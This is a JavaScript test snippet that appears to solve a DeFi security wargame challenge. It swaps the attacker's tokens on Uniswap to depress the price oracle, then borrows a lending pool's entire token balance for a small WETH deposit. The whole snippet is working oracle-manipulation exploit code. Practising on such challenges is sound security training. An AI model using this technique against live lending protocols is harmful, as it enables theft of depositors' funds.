    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const exchangeConnection = this.uniswapExchange.connect(attacker)
        const routerConnection = this.uniswapRouter.connect(attacker)
        const tokenConnection = this.token.connect(attacker)
        const WETHConnection = this.weth.connect(attacker)
        const lendingConnection = this.lendingPool.connect(attacker)

        await tokenConnection.approve(this.uniswapRouter.address, "10000000000000000000000")
        await routerConnection.swapExactTokensForETH(
            await tokenConnection.balanceOf(attacker.address),
            0,
            [this.token.address, this.weth.address],
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2
        )

        const depositRequired = (await lendingConnection.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).toString()
        await WETHConnection.deposit({value: depositRequired})
        await WETHConnection.approve(this.lendingPool.address, depositRequired)
        
        await lendingConnection.borrow(POOL_INITIAL_TOKEN_BALANCE)
    });
